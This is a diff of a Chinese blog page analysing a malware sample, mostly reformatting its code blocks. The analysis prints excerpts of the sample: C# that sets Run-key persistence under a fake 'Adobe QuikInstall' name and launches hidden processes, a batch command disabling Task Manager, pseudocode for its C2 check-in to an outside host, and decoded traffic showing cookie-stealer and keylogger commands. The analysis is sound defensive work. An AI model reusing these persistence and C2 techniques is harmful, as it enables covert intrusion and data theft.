@@ -59,12 +59,12 @@
     <div class="bar" style="width: 0;"></div>
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://i1arn.github.io">
-        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <!-- <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div> -->
         <h3 class="subtitle">恶意程序分析(1)</h3>
         <div class="social">
-            <!--        <div class="like-icon">-->
-            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
-            <!--        </div>-->
+                   <!-- <div class="like-icon"> -->
+                       <!-- <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a> -->
+                   <!-- </div> -->
             <div>
                 <div class="share">
                     
@@ -102,13 +102,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    27k
+                    15k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    25 mins.
+                    13 mins.
                 </span>
                 
                 
@@ -157,12 +157,33 @@
 <div align=center><img src="./Systemvbe解码之后.png" alt="System.vbe解码之后" width="70%" height="70%"  /></div>
 很明显的看出，vbs脚本创建了一个快捷方式并运行了一个bat脚本与一个程序
 
-<h3 id="e6ee5674bb9446c78bbc5729af6e2c28-exe"><a href="#e6ee5674bb9446c78bbc5729af6e2c28-exe" class="headerlink" title="e6ee5674bb9446c78bbc5729af6e2c28.exe"></a>e6ee5674bb9446c78bbc5729af6e2c28.exe</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(<span class="string">"SYSTEM\\CurrentControlSet\\Control\\Class\\&#123;6BDD1FC6-810F-11D0-BEC7-08002BE2092F&#125;"</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="keyword">string</span> item <span class="keyword">in</span> <span class="keyword">from</span> x <span class="keyword">in</span> registryKey.GetSubKeyNames()</span><br><span class="line">		<span class="keyword">where</span> Regex.IsMatch(x, <span class="string">"[0-9]&#123;4&#125;"</span>)</span><br><span class="line">		<span class="keyword">select</span> x)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">using</span> (RegistryKey registryKey2 = registryKey.OpenSubKey(item))</span><br><span class="line">		&#123;</span><br><span class="line">			registryKey2.SetValue(<span class="string">""</span>, <span class="number">8</span>, RegistryValueKind.DWord);  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//……</span></span><br></pre></td></tr></table></figure>
+<h3 id="e6ee5674bb9446c78bbc5729af6e2c28-exe"><a href="#e6ee5674bb9446c78bbc5729af6e2c28-exe" class="headerlink" title="e6ee5674bb9446c78bbc5729af6e2c28.exe"></a>e6ee5674bb9446c78bbc5729af6e2c28.exe</h3><pre><code class="c#">using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(&quot;SYSTEM\\CurrentControlSet\\Control\\Class\\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}&quot;))
+{
+    foreach (string item in from x in registryKey.GetSubKeyNames()
+        where Regex.IsMatch(x, &quot;[0-9]{4}&quot;)
+        select x)
+    {
+        using (RegistryKey registryKey2 = registryKey.OpenSubKey(item))
+        {
+            registryKey2.SetValue(&quot;&quot;, 8, RegistryValueKind.DWord);  
+        }
+    }
+}
+//……</code></pre>
 <p>根据<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-control-registry-tree" target="_blank" rel="noopener">microsoft的说法</a>class目录下对应的是各个设置类别的GUID，而其中存放着设备的相关配置。</p>
 <h3 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h3><p>其中bat文件中有效指令只有<code>&quot;C:\system32\svchost.exe&quot; &amp; reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f</code>，其中是执行svchost程序，然后添加注册表</p>
 <h4 id="svchost-exe"><a href="#svchost-exe" class="headerlink" title="svchost.exe"></a>svchost.exe</h4><p>这个程序运行使用在本地环境运行不起来，以为是反虚拟机调试，但是后来注意到是网络不通的问题。通过沙箱中的dns解析发现了‘ipinfo.io’、‘srv164667.hoster-test.ru’等在本地连接不成功，于是代理搬梯子准备分析调试。<br>所有程序、库都脱壳成功了，但是就是它失败。硬着头皮使用<code>dnSpy</code>进行调试。发现了些许内容  </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#伪代码</span></span><br><span class="line">BaseUrl=<span class="string">"http://srv164667.hoster-test.ru/t7rsexe3q8gjyon4o9o2p6iuzs1nv8ll5jys37mvg3nftujfj7p80zdfgwa/h0sezt8ofjrez/"</span></span><br><span class="line">TestUrl=BaseUrl+<span class="string">"srxaikiy9svo9bip1tqpu5rem3lln9zw8vgjsk7ldnc13bk2"</span></span><br><span class="line"></span><br><span class="line">TargetUrl=BaseUrl+md5(TestUrl)+<span class="string">".php"</span></span><br><span class="line">connect(TargetUrl+<span class="string">"?"</span>+md5(<span class="string">"srv164667.hoster-test.ru"</span>+<span class="string">"password"</span>)+<span class="string">"=c"</span>)</span><br><span class="line"><span class="comment">#返回&#123;"status":"UP"&#125;，猜测用来检查服务器状态</span></span><br><span class="line"></span><br><span class="line">token=connect(TargetUrl+<span class="string">"?"</span>+<span class="string">"some unknown args"</span>)</span><br><span class="line"><span class="comment">#之后的所有网络交互都有参数“11b7d19ccf1147a7a18c5d8cb8fb6bc4 = reverse(base64(token))”</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">#伪代码
+BaseUrl=&quot;http://srv164667.hoster-test.ru/t7rsexe3q8gjyon4o9o2p6iuzs1nv8ll5jys37mvg3nftujfj7p80zdfgwa/h0sezt8ofjrez/&quot;
+TestUrl=BaseUrl+&quot;srxaikiy9svo9bip1tqpu5rem3lln9zw8vgjsk7ldnc13bk2&quot;
 
+TargetUrl=BaseUrl+md5(TestUrl)+&quot;.php&quot;
+connect(TargetUrl+&quot;?&quot;+md5(&quot;srv164667.hoster-test.ru&quot;+&quot;password&quot;)+&quot;=c&quot;)
+#返回{&quot;status&quot;:&quot;UP&quot;}，猜测用来检查服务器状态
+
+token=connect(TargetUrl+&quot;?&quot;+&quot;some unknown args&quot;)
+#之后的所有网络交互都有参数“11b7d19ccf1147a7a18c5d8cb8fb6bc4 = reverse(base64(token))”
+</code></pre>
 <p>在了解了参数内容为base64编码之后，手动解析了几个参数，发现了上传系统进程等等一些内容，同时在请求的结果中也发现了base64编码之后的一些命令。</p>
 <div align=center><img src="./逆序base64解码.png" alt="逆序base64解码" width="70%" height="70%"  /></div>
 
@@ -178,10 +199,24 @@
 
 <p>分析过程中发现，请求的返回结果解码之后至少包含三种数据格式，至于已经发现的另外两种就没精力研究是啥作用了。。。</p>
 <h5 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h5><p><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System</code>的操作是将任务管理器禁用了，其中<code>HKCU</code>就是<code>HKEY_CURRNET_USER</code><br>补充一条相关路径： <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system</code></p>
-<h2 id="Starter-exe"><a href="#Starter-exe" class="headerlink" title="Starter.exe"></a>Starter.exe</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);  <span class="comment">//获取用户的应用数据目录，此处为“C:\Users\i1arn\AppData\Roaming”</span></span><br><span class="line"><span class="comment">//……</span></span><br><span class="line"><span class="comment">//复制程序到了相关文件夹中</span></span><br><span class="line"><span class="comment">//……</span></span><br><span class="line"><span class="keyword">string</span> executablePath = Application.ExecutablePath;</span><br><span class="line">RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(<span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"</span>);</span><br><span class="line">registryKey.SetValue(<span class="string">"Adobe QuikInstall"</span>, folderPath + <span class="string">"\\Adobe\\Adobe QuikInstall.exe"</span>);   <span class="comment">//设置自启程序</span></span><br><span class="line">registryKey.Close();</span><br><span class="line">Thread.Sleep(<span class="number">10000</span>);</span><br><span class="line">File.Copy(currentDirectory + <span class="string">"\\System.vbe"</span>, folderPath + <span class="string">"\\NotePad\\System.vbe"</span>);</span><br><span class="line">Process.Start(folderPath + <span class="string">"\\Adobe\\Adobe QuikInstall.exe"</span>);   <span class="comment">//启动`Adobe QuikInstall.exe`</span></span><br></pre></td></tr></table></figure>
-
+<h2 id="Starter-exe"><a href="#Starter-exe" class="headerlink" title="Starter.exe"></a>Starter.exe</h2><pre><code class="c#">Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);  //获取用户的应用数据目录，此处为“C:\Users\i1arn\AppData\Roaming”
+//……
+//复制程序到了相关文件夹中
+//……
+string executablePath = Application.ExecutablePath;
+RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;);
+registryKey.SetValue(&quot;Adobe QuikInstall&quot;, folderPath + &quot;\\Adobe\\Adobe QuikInstall.exe&quot;);   //设置自启程序
+registryKey.Close();
+Thread.Sleep(10000);
+File.Copy(currentDirectory + &quot;\\System.vbe&quot;, folderPath + &quot;\\NotePad\\System.vbe&quot;);
+Process.Start(folderPath + &quot;\\Adobe\\Adobe QuikInstall.exe&quot;);   //启动`Adobe QuikInstall.exe`</code></pre>
 <h3 id="Adobe-QuikInstall-exe"><a href="#Adobe-QuikInstall-exe" class="headerlink" title="Adobe QuikInstall.exe"></a>Adobe QuikInstall.exe</h3><p>看名字像是Adobe安装软件，其实……</p>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">process.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">process.StartInfo.Arguments = <span class="string">"/C "</span> + folderPath + <span class="string">"\\Obsidium\\Runtime Broker.exe"</span>;    </span><br><span class="line">process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;</span><br><span class="line">process.Start();</span><br><span class="line"><span class="comment">//……</span></span><br><span class="line"><span class="comment">//顺序启动了“Runtime Broker.exe”、“SecurityHealthService.exe”、“YourPhone.exe”</span></span><br></pre></td></tr></table></figure>
+<pre><code class="C#">process.StartInfo.FileName = &quot;cmd.exe&quot;;
+process.StartInfo.Arguments = &quot;/C &quot; + folderPath + &quot;\\Obsidium\\Runtime Broker.exe&quot;;    
+process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+process.Start();
+//……
+//顺序启动了“Runtime Broker.exe”、“SecurityHealthService.exe”、“YourPhone.exe”</code></pre>
 <p>正常系统中：  </p>
 <ol>
 <li><code>Runtime Broker.exe</code>用来进行开始屏幕磁贴与桌面的后台交互  </li>
@@ -190,9 +225,134 @@
 </ol>
 <h3 id="fontreview-exe"><a href="#fontreview-exe" class="headerlink" title="fontreview.exe"></a>fontreview.exe</h3><p>多种环境多次运行之后都未能发现该文件</p>
 <h1 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h1><p>通过Python脚本获取到了请求中的URL参数并对其进行了解析。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scapy</span><br><span class="line"><span class="keyword">import</span> scapy_http.http</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re，json，base64，collections</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">args=collections.defaultdict(list)</span><br><span class="line"></span><br><span class="line">packets=scapy.rdpcap(<span class="string">"./af63aed4-dfc0-4312-9d69-ae7502a2cb3b.pcap"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=re.split(<span class="string">"[?&amp;]"</span>,i.getlayer(<span class="string">"HTTPRequest"</span>).Path.decode())</span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> data[<span class="number">1</span>:]:</span><br><span class="line">            argname,argval=arg.split(<span class="string">"="</span>)</span><br><span class="line">            argval=base64.b64decode(parse.unquote(argval)[::<span class="number">-1</span>]).decode()</span><br><span class="line">            <span class="keyword">if</span> argval <span class="keyword">not</span> <span class="keyword">in</span> args[argname]:</span><br><span class="line">                args[argname].append(argval)  <span class="comment">#旨在去除重复参数值。无法使用set，格式化打印时出错</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">args=json.dumps(args,indent=<span class="number">1</span>)</span><br><span class="line">print(args)</span><br></pre></td></tr></table></figure>
+<pre><code class="Python">import scapy
+import scapy_http.http
+
+import re，json，base64，collections
+from urllib import parse
+args=collections.defaultdict(list)
+
+packets=scapy.rdpcap(&quot;./af63aed4-dfc0-4312-9d69-ae7502a2cb3b.pcap&quot;)
+for i in packets:
+    try:
+        data=re.split(&quot;[?&amp;]&quot;,i.getlayer(&quot;HTTPRequest&quot;).Path.decode())
+        for arg in data[1:]:
+            argname,argval=arg.split(&quot;=&quot;)
+            argval=base64.b64decode(parse.unquote(argval)[::-1]).decode()
+            if argval not in args[argname]:
+                args[argname].append(argval)  #旨在去除重复参数值。无法使用set，格式化打印时出错
+    except Exception as e:
+        pass
+
+args=json.dumps(args,indent=1)
+print(args)</code></pre>
 <p>从结果中直观的看见实际上参数就几个，能够直接看出相关意义的不多。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [</span><br><span class="line">  &quot;09ee87aef1bcd074085f36668392f85e262716383&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;248854911a064ebaa582d1a56b380dcf&quot;: [</span><br><span class="line">  &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;56367c166cecf6b4c653b02521db5738&quot;: [</span><br><span class="line">  &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,</span><br><span class="line">  &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,</span><br><span class="line">  &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,</span><br><span class="line">  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,</span><br><span class="line">  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,</span><br><span class="line">  &quot;&quot;,</span><br><span class="line">  &quot;done&quot;,</span><br><span class="line">  &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,</span><br><span class="line">  &quot;N&#x2F;A&quot;,</span><br><span class="line">  &quot;Login:gabriel_radrigos,Path:c:&#x2F;program files&#x2F;steam,Language:,steamID:&quot;,</span><br><span class="line">  &quot;4.7.2&quot;,</span><br><span class="line">  &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N&#x2F;A,MotherboardProduct:N&#x2F;A,MotherboardSerial:N&#x2F;A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N&#x2F;A,VideoRAM:N&#x2F;A B,VideoRes:1280 x 720,AV:N&#x2F;A,Path:C:\\system32&quot;,</span><br><span class="line">  &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,</span><br><span class="line">  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,</span><br><span class="line">  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,</span><br><span class="line">  &quot; &quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [</span><br><span class="line">  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;fb668fe31be77ee0a010de83c225c204&quot;: [</span><br><span class="line">  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,</span><br><span class="line">  &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,</span><br><span class="line">  &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,</span><br><span class="line">  &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,</span><br><span class="line">  &quot;957acf4c4fcce89f764055acf9978456&quot;,</span><br><span class="line">  &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,</span><br><span class="line">  &quot;c72a0133882ce6233c90990b8e00775c&quot;,</span><br><span class="line">  &quot;5d94deb0da6c64342915be998ce7d95f&quot;,</span><br><span class="line">  &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,</span><br><span class="line">  &quot;df4a7df5bb1d10900476bed933716663&quot;,</span><br><span class="line">  &quot;27ef1b29586798bc372642cf969b2187&quot;,</span><br><span class="line">  &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,</span><br><span class="line">  &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,</span><br><span class="line">  &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,</span><br><span class="line">  &quot;b785a88a74f90c8913744c7ba92d0be5&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;0e1f102a661f322dc855ed186f235900&quot;: [</span><br><span class="line">  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;156fde0665d178eece714785060d9d42&quot;: [</span><br><span class="line">  &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,</span><br><span class="line">  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;</span><br><span class="line"> ]</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">   &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [</span><br><span class="line">      &quot;09ee87aef1bcd074085f36668392f85e262716383&quot;</span><br><span class="line">   ],</span><br><span class="line">   &quot;248854911a064ebaa582d1a56b380dcf&quot;: [</span><br><span class="line">      &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot;</span><br><span class="line">   ],</span><br><span class="line">   &quot;56367c166cecf6b4c653b02521db5738&quot;: [</span><br><span class="line">      &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,</span><br><span class="line">      &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,</span><br><span class="line">      &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,</span><br><span class="line">      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,</span><br><span class="line">      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,</span><br><span class="line">      &quot;&quot;,</span><br><span class="line">      &quot;done&quot;,</span><br><span class="line">      &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,</span><br><span class="line">      &quot;N&#x2F;A&quot;,</span><br><span class="line">      &quot;Login:gabriel_radrigos,Path:c:&#x2F;program files&#x2F;steam,Language:,steamID:&quot;,</span><br><span class="line">      &quot;4.7.2&quot;,</span><br><span class="line">      &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N&#x2F;A,MotherboardProduct:N&#x2F;A,MotherboardSerial:N&#x2F;A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N&#x2F;A,VideoRAM:N&#x2F;A B,VideoRes:1280 x 720,AV:N&#x2F;A,Path:C:\\system32&quot;,</span><br><span class="line">      &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,</span><br><span class="line">      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,</span><br><span class="line">      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,</span><br><span class="line">      &quot; &quot;</span><br><span class="line">   ],</span><br><span class="line">   &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [</span><br><span class="line">      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;</span><br><span class="line">   ],</span><br><span class="line">   &quot;fb668fe31be77ee0a010de83c225c204&quot;: [</span><br><span class="line">      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,</span><br><span class="line">      &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,</span><br><span class="line">      &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,</span><br><span class="line">      &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,</span><br><span class="line">      &quot;957acf4c4fcce89f764055acf9978456&quot;,</span><br><span class="line">      &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,</span><br><span class="line">      &quot;c72a0133882ce6233c90990b8e00775c&quot;,</span><br><span class="line">      &quot;5d94deb0da6c64342915be998ce7d95f&quot;,</span><br><span class="line">      &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,</span><br><span class="line">      &quot;df4a7df5bb1d10900476bed933716663&quot;,</span><br><span class="line">      &quot;27ef1b29586798bc372642cf969b2187&quot;,</span><br><span class="line">      &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,</span><br><span class="line">      &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,</span><br><span class="line">      &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,</span><br><span class="line">      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;</span><br><span class="line">   ],</span><br><span class="line">   &quot;0e1f102a661f322dc855ed186f235900&quot;: [</span><br><span class="line">      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;</span><br><span class="line">   ],</span><br><span class="line">   &quot;156fde0665d178eece714785060d9d42&quot;: [</span><br><span class="line">      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,</span><br><span class="line">      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">{
+ &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [
+  &quot;09ee87aef1bcd074085f36668392f85e262716383&quot;
+ ],
+ &quot;248854911a064ebaa582d1a56b380dcf&quot;: [
+  &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot;
+ ],
+ &quot;56367c166cecf6b4c653b02521db5738&quot;: [
+  &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,
+  &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,
+  &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,
+  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,
+  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,
+  &quot;&quot;,
+  &quot;done&quot;,
+  &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,
+  &quot;N/A&quot;,
+  &quot;Login:gabriel_radrigos,Path:c:/program files/steam,Language:,steamID:&quot;,
+  &quot;4.7.2&quot;,
+  &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N/A,MotherboardProduct:N/A,MotherboardSerial:N/A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N/A,VideoRAM:N/A B,VideoRes:1280 x 720,AV:N/A,Path:C:\\system32&quot;,
+  &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,
